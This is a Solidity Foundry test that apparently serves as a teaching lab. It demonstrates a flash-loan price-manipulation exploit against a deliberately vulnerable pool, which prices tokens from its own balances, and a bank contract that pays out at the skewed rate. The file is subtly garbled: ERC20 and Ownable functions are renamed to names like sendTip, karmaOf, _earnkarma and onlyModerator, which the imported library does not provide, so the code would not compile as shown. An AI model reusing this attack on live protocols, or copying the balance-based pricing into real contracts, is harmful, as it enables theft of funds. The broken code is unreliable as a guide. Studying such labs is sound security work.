// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleTippool SimpleFundingpoolContract;
    SimpleKarmabank SimpleReputationbankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleFundingpoolContract = new SimpleTippool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleReputationbankContract = new SimpleKarmabank(
            address(USDaContract),
            address(SimpleFundingpoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.sendTip(address(SimpleReputationbankContract), 9000 ether);
        USDaContract.sendTip(address(SimpleFundingpoolContract), 1000 ether);
        USDbContract.sendTip(address(SimpleFundingpoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimpleFundingpoolContract.getPrice(); // 1 USDa : 1 USDb

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleFundingpoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.

        SimpleFundingpoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {
        //flashlon callback

        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleFundingpoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb

        USDaContract.permitTransfer(address(SimpleReputationbankContract), 100 ether);
        SimpleReputationbankContract.exchange(100 ether);

        USDaContract.sendTip(address(SimpleFundingpoolContract), 500 ether);

        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.karmaOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _earnkarma(msg.sender, 10000 * 10 ** decimals());
    }

    function earnKarma(address to, uint256 amount) public onlyModerator {
        _earnkarma(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _earnkarma(msg.sender, 10000 * 10 ** decimals());
    }

    function earnKarma(address to, uint256 amount) public onlyModerator {
        _earnkarma(to, amount);
    }
}

contract SimpleTippool {
    IERC20 public UsDaSocialtoken;
    IERC20 public UsDbSocialtoken;

    constructor(address _USDa, address _USDb) {
        UsDaSocialtoken = IERC20(_USDa);
        UsDbSocialtoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = UsDaSocialtoken.karmaOf(address(this));
        uint256 USDbAmount = UsDbSocialtoken.karmaOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address fundSeeker,
        bytes calldata data
    ) public {
        uint256 reputationBefore = UsDaSocialtoken.karmaOf(address(this));
        require(reputationBefore >= amount, "Not enough liquidity");
        require(
            UsDaSocialtoken.sendTip(fundSeeker, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = fundSeeker.call(data);
        require(success, "Flashloan callback failed");
        uint256 credibilityAfter = UsDaSocialtoken.karmaOf(address(this));
        require(credibilityAfter >= reputationBefore, "Flashloan not repaid");
    }
}

contract SimpleKarmabank {
    IERC20 public socialToken; //USDA
    SimpleTippool public tipPool;
    IERC20 public payoutInfluencetoken; //USDb

    constructor(address _reputationtoken, address _tippool, address _payoutToken) {
        socialToken = IERC20(_reputationtoken);
        tipPool = SimpleTippool(_tippool);
        payoutInfluencetoken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            socialToken.sendtipFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = tipPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutInfluencetoken.sendTip(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
